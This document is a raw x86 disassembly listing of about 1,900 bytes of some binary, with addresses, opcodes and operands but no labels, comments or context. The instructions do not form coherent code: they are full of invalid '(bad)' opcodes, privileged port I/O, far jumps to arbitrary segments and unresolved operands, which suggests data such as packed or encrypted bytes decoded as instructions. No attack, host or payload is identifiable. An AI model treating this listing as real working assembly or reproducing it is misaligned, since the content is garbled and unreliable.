  418f67:	sbb    eax,0xdfce84fd
  418f6c:	ss cmp al,0x6e
  418f6f:	in     al,0x24
  418f71:	sbb    BYTE PTR [ebx-0x2],dh
  418f74:	addr16 adc ebp,0xffffffdc
  418f78:	scas   eax,DWORD PTR es:[edi]
  418f79:	sti    
  418f7a:	pop    ss
  418f7b:	adc    edx,esi
  418f7d:	jp     0x418f92
  418f7f:	daa    
  418f80:	repnz push esp
  418f82:	hlt    
  418f83:	mul    BYTE PTR [ebx-0x43e75a50]
  418f89:	push   0xffffff96
  418f8b:	xchg   BYTE PTR [eax],ah
  418f8d:	push   eax
  418f8e:	jmp    0xf3bb:0x54d309ef
  418f95:	mov    es,esi
  418f97:	(bad)  
  418f98:	out    0xaa,al
  418f9a:	xor    bh,BYTE PTR [eax-0x33449009]
  418fa0:	clc    
  418fa1:	dec    edi
  418fa2:	xor    al,0x76
  418fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fa5:	mov    cs,WORD PTR [ecx+0x34]
  418fa8:	dec    ebx
  418fa9:	mov    edi,0x61003772
  418fae:	in     eax,dx
  418faf:	mov    ebx,0x2d8d1a83
  418fb4:	pop    esp
  418fb5:	cmp    DWORD PTR [eax+0x3beae437],esp
  418fbb:	fidivr WORD PTR [esi+0x7dc182f8]
  418fc1:	sub    BYTE PTR fs:[esi],0x41
  418fc5:	hlt    
  418fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fc7:	stos   DWORD PTR es:[edi],eax
  418fc8:	cmp    ch,BYTE PTR [edx]
  418fca:	in     eax,0xbe
  418fcc:	hlt    
  418fcd:	loop   0x41903e
  418fcf:	inc    esi
  418fd0:	stos   BYTE PTR es:[edi],al
  418fd1:	pop    ds
  418fd2:	outs   dx,BYTE PTR ds:[esi]
  418fd3:	push   edi
  418fd4:	push   cs
  418fd5:	mov    ch,0xfa
  418fd7:	or     eax,0x2ec2cf07
  418fdc:	sahf   
  418fdd:	cmp    ecx,ebx
  418fdf:	pop    ebx
  418fe0:	mov    eax,0x23db067
  418fe5:	lock lea esp,[eax-0x6d5f7796]
  418fec:	sub    edx,DWORD PTR [edi+0x61a1b0e9]
  418ff2:	jb     0x419048
  418ff4:	in     al,dx
  418ff5:	inc    ebx
  418ff6:	xor    al,0xb5
  418ff8:	test   BYTE PTR [esi+ecx*4-0x5bc07fb7],bh
  418fff:	dec    esi
  419000:	nop
  419001:	jl     0x418f8d
  419003:	les    eax,FWORD PTR [eax+0x2372ec0f]
  419009:	pop    edx
  41900a:	fwait
  41900b:	push   edi
  41900c:	lea    esi,[ebx]
  41900e:	or     BYTE PTR [edi+eax*4+0x53d24cc0],bl
  419015:	les    eax,FWORD PTR [ecx+0x59fbc82f]
  41901b:	mov    ds:0x936f22aa,eax
  419020:	inc    eax
  419021:	mov    eax,ds:0x75c8714f
  419026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419027:	push   0x48
  419029:	sbb    eax,0x24658076
  41902e:	pop    esi
  41902f:	cmp    esp,DWORD PTR [ebx]
  419031:	ja     0x418fd9
  419033:	and    al,bh
  419035:	sbb    ch,BYTE PTR [ebx-0x4d6c0247]
  41903b:	jae    0x418fc2
  41903d:	les    ebp,FWORD PTR [ebx]
  41903f:	pop    edx
  419040:	rcr    BYTE PTR [esp+ecx*8],cl
  419043:	mov    eax,ds:0x286ff4f8
  419048:	mov    al,ds:0x2ad152c8
  41904d:	mov    cl,dl
  41904f:	nop
  419050:	dec    ecx
  419051:	popf   
  419052:	mov    dl,0x56
  419054:	dec    ecx
  419055:	dec    edi
  419056:	test   edx,ebp
  419058:	outs   dx,BYTE PTR ds:[esi]
  419059:	jmp    0x41907f
  41905b:	sbb    edi,DWORD PTR [ecx]
  41905d:	(bad)  
  41905e:	gs stos BYTE PTR es:[edi],al
  419060:	inc    ecx
  419061:	aam    0x87
  419063:	(bad)  
  419064:	fisubr DWORD PTR [esi]
  419066:	sub    eax,0xd70a1b90
  41906b:	ror    DWORD PTR [ebp-0x4e],0xa8
  41906f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419070:	ffreep st(2)
  419072:	retf   0x4b0e
  419075:	retf   0x356e
  419078:	mov    bh,0xe4
  41907a:	sub    ch,ah
  41907c:	adc    DWORD PTR [ebx-0x46dfed2e],ebp
  419082:	adc    DWORD PTR [ebx+0x28d99f9d],ecx
  419088:	daa    
  419089:	lds    ebx,FWORD PTR [ecx-0x59cf2599]
  41908f:	and    ebp,DWORD PTR [ebp+0x6a2b28da]
  419095:	sbb    eax,0x59258e07
  41909a:	or     BYTE PTR [edx-0x2a717e9b],ah
  4190a0:	mov    ds:0xfed826d3,eax
  4190a5:	aaa    
  4190a6:	sahf   
  4190a7:	inc    DWORD PTR [ecx]
  4190a9:	xchg   edx,eax
  4190aa:	xchg   esi,eax
  4190ab:	inc    ebx
  4190ac:	(bad)  
  4190ad:	sahf   
  4190ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190af:	inc    ebp
  4190b0:	xchg   edi,eax
  4190b1:	dec    esi
  4190b2:	(bad)  
  4190b3:	cmp    bh,BYTE PTR [ebx+edi*2]
  4190b6:	jnp    0x41911a
  4190b8:	or     dl,0x33
  4190bb:	sti    
  4190bc:	mov    cs,ebp
  4190be:	call   0x475c4757
  4190c3:	cmp    DWORD PTR [esi+0x41],esi
  4190c6:	push   eax
  4190c7:	sub    esi,DWORD PTR [eax+0x2bf6fcd]
  4190cd:	add    eax,0x8e2fb52c
  4190d2:	mov    edi,0xfabbb754
  4190d7:	rol    ecx,1
  4190d9:	pop    es
  4190da:	into   
  4190db:	sahf   
  4190dc:	clc    
  4190dd:	out    0x3b,eax
  4190df:	cwde   
  4190e0:	dec    ebp
  4190e1:	inc    ebx
  4190e2:	push   edi
  4190e3:	call   0xa28e:0xd8994be9
  4190ea:	push   0xffffffac
  4190ec:	out    dx,al
  4190ed:	scas   al,BYTE PTR es:[edi]
  4190ee:	adc    eax,0xafb40562
  4190f3:	add    DWORD PTR [edx+0xe],edi
  4190f6:	bound  esi,QWORD PTR [ebx+ecx*4+0x5a249e9d]
  4190fd:	popa   
  4190fe:	adc    bl,BYTE PTR [esi+0x63]
  419101:	or     ebp,ebp
  419103:	aaa    
  419104:	cld    
  419105:	cmp    eax,0x414503ca
  41910a:	cmc    
  41910b:	push   ebp
  41910c:	cmp    DWORD PTR [ebx],0xbb888fe4
  419112:	mov    ecx,0x6cac3d66
  419117:	mov    edi,0x3a35f8b6
  41911c:	jp     0x419145
  41911e:	or     eax,0xa66aa93d
  419123:	push   edx
  419124:	mov    ds:0xebd98fe7,eax
  419129:	lods   eax,DWORD PTR ds:[esi]
  41912a:	push   ss
  41912b:	dec    ebx
  41912c:	or     DWORD PTR [eax],0x42
  41912f:	ja     0x41918e
  419131:	jb     0x419107
  419133:	jo     0x41918d
  419135:	imul   ebp,DWORD PTR [edx+0x48],0x1c96c8d7
  41913c:	outs   dx,BYTE PTR ds:[esi]
  41913d:	clc    
  41913e:	pop    edx
  41913f:	ja     0x419101
  419141:	xchg   ebx,eax
  419142:	jb     0x4190ef
  419144:	aas    
  419145:	rol    dl,0xd6
  419148:	jecxz  0x419123
  41914a:	pusha  
  41914b:	inc    edx
  41914c:	test   cl,cl
  41914e:	fdivr  QWORD PTR [ebx+0x5fc65ab3]
  419154:	inc    ecx
  419155:	fwait
  419156:	and    al,0xd4
  419158:	add    DWORD PTR [esi+0xfc1d16d],ecx
  41915e:	(bad)  
  41915f:	fisttp WORD PTR [edi]
  419161:	mov    edi,0xe787d262
  419166:	and    eax,0xffffffde
  419169:	jl     0x419198
  41916b:	push   edi
  41916c:	add    al,0xa9
  41916e:	pop    esi
  41916f:	ret    
  419170:	ja     0x419159
  419172:	ror    DWORD PTR [eax],1
  419174:	lock aad 0xcd
  419177:	scas   eax,DWORD PTR es:[edi]
  419178:	jmp    0x419128
  41917a:	in     al,dx
  41917b:	jno    0x4191fc
  41917d:	or     BYTE PTR [ebx+0x13],cl
  419180:	or     ah,BYTE PTR [esi-0x31]
  419183:	(bad)  
  419184:	fisubr WORD PTR [esi]
  419186:	add    al,0x55
  419188:	or     ch,BYTE PTR [ecx]
  41918a:	jne    0x4191e7
  41918c:	inc    DWORD PTR [edx-0x64]
  41918f:	add    eax,0xd1f0bb97
  419194:	icebp  
  419195:	jbe    0x4191d7
  419197:	cmp    bl,0x0
  41919a:	push   edx
  41919b:	retf   0xe550
  41919e:	or     al,0xe4
  4191a0:	scas   al,BYTE PTR es:[edi]
  4191a1:	mov    DWORD PTR ds:0xc3d1fda0,edx
  4191a7:	mov    ch,0x1
  4191a9:	sub    al,0x4e
  4191ab:	xor    esp,DWORD PTR [eax+0xafce6dc]
  4191b1:	ret    0xd934
  4191b4:	imul   edi,DWORD PTR [edx-0x44],0x27570e66
  4191bb:	or     BYTE PTR [edx+ebp*1-0x60f189dc],0x40
  4191c3:	pusha  
  4191c4:	push   eax
  4191c5:	cwde   
  4191c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191c7:	jle    0x419234
  4191c9:	in     eax,0x22
  4191cb:	aaa    
  4191cc:	mov    eax,0x6fef04ff
  4191d1:	cmp    bl,bl
  4191d3:	out    dx,al
  4191d4:	jo     0x4191d9
  4191d6:	adc    al,0x6f
  4191d8:	xchg   edi,eax
  4191d9:	cld    
  4191da:	cli    
  4191db:	enter  0x2794,0x4f
  4191df:	push   esp
  4191e0:	or     BYTE PTR [ecx-0x47db1768],0x46
  4191e7:	xchg   esi,eax
  4191e8:	or     esp,ebp
  4191ea:	iret   
  4191eb:	(bad)  
  4191ec:	sub    eax,0x4332373d
  4191f1:	popf   
  4191f2:	test   BYTE PTR ds:0xc02a9842,cl
  4191f8:	mov    dh,0x93
  4191fa:	sar    DWORD PTR [eax-0x460d073a],1
  419200:	das    
  419201:	pusha  
  419202:	inc    ecx
  419203:	mov    WORD PTR [ecx-0x3799079a],cs
  419209:	push   edx
  41920a:	push   ss
  41920b:	pop    esi
  41920c:	ja     0x419278
  41920e:	mov    eax,ds:0x8e625b21
  419213:	retf   0x719a
  419216:	jge    0x4191b9
  419218:	mov    bh,0x5
  41921a:	adc    eax,0x4db30908
  41921f:	and    al,0xfd
  419221:	ret    
  419222:	sub    esp,DWORD PTR fs:[ebp+esi*2-0x2e9d0315]
  41922a:	in     eax,dx
  41922b:	(bad)  
  41922c:	rol    DWORD PTR [edx-0x2],cl
  41922f:	fsubr  DWORD PTR [edi+0x62]
  419232:	cs mov edi,0x777942d0
  419238:	inc    ebx
  419239:	sti    
  41923a:	push   0x4d
  41923c:	aaa    
  41923d:	aaa    
  41923e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41923f:	dec    esi
  419240:	mov    dh,0x9f
  419242:	inc    eax
  419243:	rcl    DWORD PTR [edi+edi*1+0x764e2bed],1
  41924a:	mov    edi,0x9929ed8e
  41924f:	das    
  419250:	mov    edi,0xd2b44f8
  419255:	mov    eax,ds:0x1bf76f6c
  41925a:	xchg   edi,eax
  41925b:	pop    edx
  41925c:	add    al,0x7b
  41925e:	mov    ch,0xef
  419260:	addr16 mov esp,0xcedf5f91
  419266:	sub    bh,BYTE PTR [eax]
  419268:	aaa    
  419269:	retf   
  41926a:	ja     0x419252
  41926c:	xchg   edx,eax
  41926d:	mov    esi,0x732f86c2
  419272:	(bad)  
  419274:	mov    bh,0x4b
  419276:	sti    
  419277:	lds    ebp,FWORD PTR [edi]
  419279:	(bad)  
  41927a:	sub    bh,BYTE PTR [esi-0x74]
  41927d:	hlt    
  41927e:	inc    esp
  41927f:	(bad)  
  419280:	sbb    edi,DWORD PTR [edx]
  419282:	and    DWORD PTR [eax+0x42],eax
  419285:	pcmpeqw mm2,QWORD PTR [ebx+0x7c9537ff]
  41928c:	imul   ebp,DWORD PTR [ecx-0x4b],0xffffff81
  419290:	jecxz  0x4192f1
  419292:	push   0xe0a9cc6d
  419297:	cli    
  419298:	adc    ebp,DWORD PTR [ebp-0x22]
  41929b:	mov    edi,0xa44ee5be
  4192a0:	das    
  4192a1:	add    ch,bh
  4192a3:	add    eax,0x88c0cda9
  4192a8:	dec    BYTE PTR [ecx]
  4192aa:	jae    0x419247
  4192ac:	retf   0x15b2
  4192af:	test   al,0xf8
  4192b1:	aas    
  4192b2:	sbb    edx,DWORD PTR [edx]
  4192b4:	pop    edi
  4192b5:	push   eax
  4192b6:	pop    ebx
  4192b7:	mov    ebp,0xd0f8cdee
  4192bc:	pop    ecx
  4192bd:	int3   
  4192be:	pop    ds
  4192bf:	mov    bl,0x9f
  4192c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192c2:	inc    BYTE PTR [ebx-0x1b1664e8]
  4192c8:	mov    dh,0x5b
  4192ca:	call   0xa7995607
  4192cf:	mov    BYTE PTR [edx-0x15],bl
  4192d2:	retf   0x4618
  4192d5:	(bad)  
  4192d6:	rcr    DWORD PTR [ebx-0x4cd89ca2],1
  4192dc:	push   ebx
  4192dd:	icebp  
  4192de:	sti    
  4192df:	cmp    eax,0x3d8cecd9
  4192e4:	jne    0x41929e
  4192e6:	cmp    eax,0x22347552
  4192eb:	push   ebx
  4192ec:	jae    0x419288
  4192ee:	dec    DWORD PTR [eax-0xc]
  4192f1:	stc    
  4192f2:	(bad)  
  4192f4:	data16 int 0x27
  4192f7:	mov    esi,ebx
  4192f9:	inc    eax
  4192fa:	outs   dx,DWORD PTR ds:[esi]
  4192fb:	pop    esi
  4192fc:	rol    DWORD PTR [ecx+0x4b],cl
  4192ff:	fild   QWORD PTR [edx+0x1]
  419302:	ficom  WORD PTR [ebp+0x5a5060e4]
  419308:	and    dh,cl
  41930a:	fidiv  DWORD PTR [ebx-0x2ba8f087]
  419310:	dec    eax
  419311:	pop    es
  419312:	mov    bh,0x35
  419314:	ret    0x938a
  419317:	jl     0x4192c3
  419319:	xor    al,0xf8
  41931b:	stos   DWORD PTR es:[edi],eax
  41931c:	xchg   edi,eax
  41931d:	scas   eax,DWORD PTR es:[edi]
  41931e:	adc    DWORD PTR [ebp-0x2c],0x55
  419322:	mov    ah,0x7e
  419324:	js     0x41932a
  419326:	push   ecx
  419327:	mov    ?,ebp
  419329:	mov    edx,0x85dbaa5d
  41932e:	fiadd  DWORD PTR ss:[eax+eax*8]
  419332:	ret    0x7a05
  419335:	or     al,0x76
  419337:	pop    esi
  419338:	mov    ecx,0x2d2bd8d4
  41933d:	xchg   ebx,eax
  41933e:	xor    DWORD PTR [ebx],edx
  419340:	out    dx,eax
  419341:	inc    edx
  419342:	fadd   DWORD PTR [ebx+0x166e3e40]
  419348:	mov    DWORD PTR [edi-0x12],ecx
  41934b:	js     0x41937f
  41934d:	daa    
  41934e:	cmp    al,0xda
  419350:	jge    0x4193a4
  419352:	sub    ch,BYTE PTR [esi]
  419354:	pop    ds
  419355:	dec    eax
  419356:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419358:	pop    ds
  419359:	jno    0x41931c
  41935b:	pop    ss
  41935c:	adc    bh,BYTE PTR [ebx]
  41935e:	sub    DWORD PTR [eax-0x3b011028],edi
  419364:	fwait
  419365:	je     0x4193c0
  419367:	ja     0x4193a3
  419369:	push   edi
  41936a:	stos   DWORD PTR es:[edi],eax
  41936b:	push   edi
  41936c:	push   ecx
  41936d:	les    eax,FWORD PTR [ecx-0x32]
  419370:	mov    eax,ds:0x2f16f2ab
  419375:	add    ch,BYTE PTR [ecx-0x4846592]
  41937b:	push   esi
  41937c:	mov    edx,0xf4ae8536
  419381:	push   ecx
  419382:	je     0x419398
  419384:	push   edi
  419385:	cmc    
  419386:	or     DWORD PTR [ecx],esi
  419388:	mov    ch,0x72
  41938a:	xor    ebx,ebp
  41938c:	xor    DWORD PTR [ebx+0x16161845],eax
  419392:	jg     0x419362
  419394:	frstor ds:0x9870eb04
  41939a:	add    bl,ch
  41939c:	fiadd  WORD PTR [edi+edi*8]
  41939f:	mov    al,0xc8
  4193a1:	popf   
  4193a2:	test   eax,0x78f97a99
  4193a7:	dec    ebp
  4193a8:	sub    eax,0xb808b3ab
  4193ad:	jmp    0x2567:0xde01f351
  4193b4:	clc    
  4193b5:	pop    ebp
  4193b6:	aad    0xf5
  4193b8:	gs out dx,eax
  4193ba:	push   ds
  4193bb:	cs loope 0x4193fe
  4193be:	push   es
  4193bf:	lahf   
  4193c0:	jbe    0x419404
  4193c2:	cld    
  4193c3:	xchg   ecx,eax
  4193c4:	mov    edi,0xfd21aee6
  4193c9:	pop    ds
  4193ca:	push   edx
  4193cb:	aam    0xa6
  4193cd:	xchg   esi,eax
  4193ce:	lahf   
  4193cf:	mov    ?,WORD PTR [esi-0x34]
  4193d2:	loop   0x4193eb
  4193d4:	push   cs
  4193d5:	aas    
  4193d6:	jmp    ebx
  4193d8:	int    0x6c
  4193da:	mov    al,0xe7
  4193dc:	lock neg bl
  4193df:	mov    WORD PTR [edx+0x34],ss
  4193e2:	das    
  4193e3:	jmp    0x4193c4
  4193e5:	add    esp,DWORD PTR [ebx]
  4193e7:	mov    eax,ds:0xa7bbb86b
  4193ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193ed:	inc    esp
  4193ee:	cwde   
  4193ef:	enter  0xabeb,0xa2
  4193f3:	shr    BYTE PTR [esi+0x6a093ad4],cl
  4193f9:	cld    
  4193fa:	(bad)  
  4193fb:	add    eax,DWORD PTR [edx-0x26]
  4193fe:	and    DWORD PTR [edi],ebx
  419400:	jbe    0x419387
  419402:	out    dx,al
  419403:	adc    eax,0xfd8c2719
  419408:	pop    ds
  419409:	pop    DWORD PTR [eax+0x1eb63d4c]
  41940f:	loope  0x4193d5
  419411:	pop    ebx
  419412:	stc    
  419413:	(bad)  
  419414:	out    0xda,al
  419416:	in     al,0xca
  419418:	es adc eax,0x68693c7a
  41941e:	mov    eax,ds:0x38d2bc48
  419423:	xor    ch,ah
  419425:	pop    ss
  419426:	mov    cs,WORD PTR [edi]
  419428:	test   al,0x8d
  41942a:	enter  0xcbe9,0xed
  41942e:	test   al,cl
  419430:	in     al,0xad
  419432:	jg     0x419484
  419434:	mov    WORD PTR [edi-0x73],fs
  419437:	arpl   WORD PTR [edi-0x25],di
  41943a:	or     BYTE PTR [edi],al
  41943c:	pop    ecx
  41943d:	mov    al,0x1a
  41943f:	fbld   TBYTE PTR [esi-0xfc091d8]
  419445:	out    dx,al
  419446:	test   esi,ecx
  419448:	pop    ebx
  419449:	fidiv  DWORD PTR [esi+0x3d4eaf8f]
  41944f:	(bad)  
  419450:	call   0x5511:0x82182d5d
  419457:	addr16 xor ebp,ecx
  41945a:	test   eax,0x99e10af9
  41945f:	dec    edx
  419460:	xchg   ebp,eax
  419461:	dec    eax
  419462:	cmp    BYTE PTR [esi+eiz*1+0x720440cd],0x53
  41946a:	push   0x12cf4b7f
  41946f:	mov    WORD PTR [eax+0x769def36],?
  419475:	mov    bl,0xdd
  419477:	pop    ds
  419478:	dec    ecx
  419479:	sub    esp,DWORD PTR [bp+di]
  41947c:	test   al,0x26
  41947e:	sahf   
  41947f:	(bad)  
  419480:	retf   
  419481:	test   DWORD PTR [ecx],ecx
  419483:	lock loope 0x419448
  419486:	lods   eax,DWORD PTR ds:[esi]
  419487:	push   ds
  419488:	or     DWORD PTR [edx],0x31eebe3e
  41948e:	outs   dx,DWORD PTR ds:[esi]
  41948f:	cs aad 0x4f
  419492:	aas    
  419493:	aam    0x7d
  419495:	(bad)  
  419496:	xchg   ebx,eax
  419497:	ins    BYTE PTR es:[edi],dx
  419498:	imul   esp,DWORD PTR [eax],0xffffffdb
  41949b:	sub    eax,DWORD PTR [eax+esi*8]
  41949e:	test   BYTE PTR [edi-0x516efe6d],dl
  4194a4:	xor    eax,0x91bf6729
  4194a9:	sub    dh,dh
  4194ab:	or     ah,dh
  4194ad:	sbb    DWORD PTR ds:0x68583c27,eax
  4194b3:	ins    BYTE PTR es:[edi],dx
  4194b4:	push   ecx
  4194b5:	sti    
  4194b6:	aad    0x18
  4194b8:	out    0x1d,eax
  4194ba:	pop    ebx
  4194bb:	xchg   esi,eax
  4194bc:	mov    eax,0x76b481af
  4194c1:	push   edi
  4194c2:	call   0xd113a64c
  4194c7:	sub    eax,0xd2f7f75d
  4194cc:	lea    ebp,[ecx-0x1c3f19d7]
  4194d2:	in     al,dx
  4194d3:	jmp    0xdd33:0x1a0eb315
  4194da:	test   BYTE PTR [ebx+0x49],dh
  4194dd:	scas   al,BYTE PTR es:[edi]
  4194de:	xor    dh,BYTE PTR [esi]
  4194e0:	ret    
  4194e1:	xor    BYTE PTR [ebx+0x20],ch
  4194e4:	mov    esp,0xf5f7c198
  4194e9:	add    esi,esi
  4194eb:	push   eax
  4194ec:	iret   
  4194ed:	adc    eax,DWORD PTR [esi+0x491fadc1]
  4194f3:	imul   esi,DWORD PTR [esi+0x2d],0xfbc20f73
  4194fa:	dec    eax
  4194fb:	pop    edx
  4194fc:	mov    edx,0x40181702
  419501:	(bad)  
  419502:	lods   eax,DWORD PTR ds:[esi]
  419503:	add    BYTE PTR [edx-0x32],dl
  419506:	pop    ecx
  419507:	cs add eax,0x6b209c4c
  41950d:	inc    eax
  41950e:	mov    dh,0x5e
  419510:	inc    edx
  419511:	inc    ecx
  419512:	shr    ebp,0xa1
  419515:	inc    esp
  419516:	pop    edi
  419517:	xor    DWORD PTR [esi],esi
  419519:	rcr    BYTE PTR [edx],1
  41951b:	fwait
  41951c:	stos   DWORD PTR es:[edi],eax
  41951d:	(bad)  
  41951e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41951f:	mov    al,ds:0x6c9e94e5
  419524:	nop
  419525:	stos   BYTE PTR es:[edi],al
  419526:	imul   edi,DWORD PTR [esi+0x643c1a97],0x3
  41952d:	add    bl,BYTE PTR [ebx]
  41952f:	mov    DWORD PTR [ebx+0x66b7469a],edi
  419535:	adc    ebp,DWORD PTR [ebp-0x5c]
  419538:	xchg   esp,eax
  419539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41953a:	aad    0xc6
  41953c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41953d:	clc    
  41953e:	pop    edx
  41953f:	fs mov ebp,0x75d07546
  419545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419546:	adc    DWORD PTR [edx-0x701a3204],0xfffffff5
  41954d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41954e:	test   eax,0x7f18a55b
  419553:	test   BYTE PTR [ecx],bl
  419555:	pop    edx
  419556:	mov    BYTE PTR [esi-0x1cc778be],bl
  41955c:	fidivr DWORD PTR [eax-0x77]
  41955f:	ror    ah,0x55
  419562:	inc    esp
  419563:	cwde   
  419564:	stos   BYTE PTR es:[edi],al
  419565:	inc    edx
  419566:	mov    gs,edx
  419568:	inc    ecx
  419569:	leave  
  41956a:	leave  
  41956b:	xchg   ecx,eax
  41956c:	es in  al,0x33
  41956f:	push   0x71c67f13
  419574:	adc    eax,DWORD PTR [ebx+0x3cdbe36e]
  41957a:	add    eax,0x3f12576a
  41957f:	add    BYTE PTR [ebp-0x4c],al
  419582:	in     eax,0x57
  419584:	push   cs
  419585:	jnp    0x4195f2
  419587:	pushf  
  419588:	push   0x60bf0f93
  41958d:	xchg   ecx,eax
  41958e:	sub    esp,DWORD PTR [eax]
  419590:	fdiv   DWORD PTR [edx+0x26]
  419593:	dec    ebx
  419594:	add    edx,DWORD PTR [ecx]
  419596:	retf   0x2a0d
  419599:	cwde   
  41959a:	aaa    
  41959b:	retf   
  41959c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41959d:	jne    0x4195b1
  41959f:	xchg   esp,eax
  4195a0:	call   FWORD PTR [esi+0x2f]
  4195a3:	jg     0x4195de
  4195a5:	rol    DWORD PTR [esi-0x3b92881b],cl
  4195ab:	push   ss
  4195ac:	xor    DWORD PTR [edi],0xa5a63fdf
  4195b2:	aam    0xc1
  4195b4:	test   DWORD PTR [eax],0x57bb0223
  4195ba:	in     al,0x87
  4195bc:	(bad)  
  4195bd:	jne    0x41956c
  4195bf:	inc    ebp
  4195c0:	loop   0x4195c6
  4195c2:	out    dx,eax
  4195c3:	inc    edi
  4195c4:	rcl    DWORD PTR [ecx],0x46
  4195c7:	nop
  4195c8:	jbe    0x41959f
  4195ca:	lock xchg ebp,eax
  4195cc:	das    
  4195cd:	ret    
  4195ce:	adc    DWORD PTR [ecx-0xc],edx
  4195d1:	nop
  4195d2:	daa    
  4195d3:	retf   
  4195d4:	sar    BYTE PTR [ebx+ebx*8-0x6d401e7e],1
  4195db:	aad    0xdd
  4195dd:	push   esi
  4195de:	fcmovnb st,st(3)
  4195e0:	or     al,0xe4
  4195e2:	xor    BYTE PTR [ecx+edi*4-0x6b],0xc5
  4195e7:	adc    eax,0x61ae701e
  4195ec:	leave  
  4195ed:	mov    ebp,0x72b3cbb4
  4195f2:	lds    ebx,FWORD PTR [ebp+ecx*2+0x25]
  4195f6:	in     eax,dx
  4195f7:	jns    0x419636
  4195f9:	outs   dx,BYTE PTR ds:[esi]
  4195fa:	xor    al,ch
  4195fc:	ds mov ebx,0x90cef52f
  419602:	pop    ds
  419603:	dec    edi
  419604:	out    dx,al
  419605:	jl     0x41966a
  419607:	mov    ss,WORD PTR [esi]
  419609:	dec    ebx
  41960a:	mov    esp,0x67b48a50
  41960f:	(bad)  
  419610:	arpl   bx,ax
  419612:	push   edx
  419613:	push   es
  419614:	inc    esp
  419615:	xchg   edi,eax
  419616:	dec    edx
  419617:	mov    ch,BYTE PTR ds:0x9b95dca0
  41961d:	out    dx,eax
  41961e:	sbb    dh,dh
  419620:	pop    esi
  419621:	pop    ecx
  419622:	arpl   WORD PTR [edi-0x187d05bc],bx
  419628:	hlt    
  419629:	pop    edi
  41962a:	aam    0xbf
  41962c:	xchg   ecx,eax
  41962d:	ss add edx,esp
  419630:	pusha  
  419631:	mov    ah,BYTE PTR [eax]
  419633:	mov    ch,0xb1
  419635:	sbb    BYTE PTR [eax-0x69],0x6d
  419639:	inc    ebx
  41963a:	cdq    
  41963b:	lods   eax,DWORD PTR ds:[esi]
  41963c:	loope  0x419625
  41963e:	cwde   
  41963f:	pop    esp
  419640:	lea    ebp,[eax+0x76]
  419643:	fbld   TBYTE PTR [esi-0x1b3e1735]
  419649:	mov    al,0xa7
  41964b:	es pop esp
  41964d:	sub    DWORD PTR [ecx],0x6b
  419650:	mov    edi,0x277d0d0e
  419655:	or     edx,DWORD PTR [ebp+0x25]
  419658:	mov    al,ds:0x667d9372
  41965d:	push   eax
  41965e:	ins    BYTE PTR es:[edi],dx
  41965f:	push   esp
  419660:	out    0xef,eax
  419662:	add    eax,0xe802d6d9
  419667:	in     al,0x7a
  419669:	dec    ebx
  41966a:	outs   dx,BYTE PTR ds:[esi]
  41966b:	cs cld 
  41966d:	xchg   ebx,eax
  41966e:	dec    ebp
  41966f:	sbb    eax,0x53960dc
  419674:	js     0x419613
  419676:	dec    edx
  419677:	cdq    
  419678:	lea    ebp,[eax+0x3508a54b]
  41967e:	push   ss
  41967f:	retfw  
  419681:	retf   
  419682:	pushf  
  419683:	int3   
  419684:	xor    DWORD PTR [ebx-0x780d5969],esi
  41968a:	and    DWORD PTR [esi+ebx*8-0x51fb52d1],esp
  419691:	nop
  419692:	inc    esi
  419693:	jo     0x419616
  419695:	test   BYTE PTR [ebp-0x179ea5e3],cl
  41969b:	push   esp
  41969c:	xor    eax,0x28b767c9
  4196a1:	inc    eax
  4196a2:	outs   dx,DWORD PTR ds:[esi]
  4196a3:	xor    BYTE PTR [ecx],ah
  4196a5:	cs pop eax
  4196a7:	ins    DWORD PTR es:[edi],dx
  4196a8:	sar    DWORD PTR [eax],0xb4
  4196ab:	sub    ax,0xfba2
  4196af:	adc    eax,0xc8fd948c
  4196b4:	(bad)  
  4196b5:	push   ss
  4196b6:	in     al,dx
  4196b7:	adc    dl,BYTE PTR [ecx]
  4196b9:	mov    dl,0x50
  4196bb:	(bad)
  4196be:	sahf   
  4196bf:	fstp   QWORD PTR [edx]
  4196c1:	xchg   ebp,eax
  4196c2:	lea    ebp,[esi*2-0x40cf28a8]
  4196c9:	xor    eax,edi
  4196cb:	adc    al,0xb
  4196cd:	sbb    bl,al
  4196cf:	dec    edx
  4196d0:	pusha  
  4196d1:	jle    0x4196cd
  4196d3:	mov    esi,0xc536c712
  4196d8:	test   DWORD PTR [esi+0x61],0xca6bc84a
  4196df:	xor    BYTE PTR [edi-0x32],0xd6
  4196e3:	xor    DWORD PTR [edx+0x20],ebp
  4196e6:	cmp    al,0xd9
  4196e8:	mov    al,ds:0x2937cd53
  4196ed:	mov    dl,0x9c
  4196ef:	push   ebx
  4196f0:	xchg   esi,eax
  4196f1:	leave  
  4196f2:	cmp    BYTE PTR [eax+0x639e0f0f],bl
  4196f8:	rol    dl,0xe
  4196fb:	sbb    eax,0x9b70f17e
  419700:	xor    edi,DWORD PTR [eax+0x1cd86a57]
  419706:	call   0x7a059ce1
  41970b:	iret   
  41970c:	fistp  QWORD PTR [ecx+0x28]
  41970f:	(bad)  
  419710:	xchg   esi,eax
  419711:	sar    DWORD PTR [ebp+0x72],cl
  419714:	pop    esi
  419715:	mov    dh,BYTE PTR [ebp+eiz*4-0x2674b8c5]
  41971c:	jecxz  0x4196df
  41971e:	inc    edx
  41971f:	add    eax,0x41c4ac52
  419724:	mov    cl,0x7a
  419726:	and    eax,0x7e1cf018
  41972b:	(bad)  
  41972c:	mov    ds,edi
  41972e:	and    al,dl
  419730:	xor    dl,BYTE PTR [edx+0x54]
  419733:	sbb    BYTE PTR [edx],ch
  419735:	or     ah,ch
  419737:	aaa    
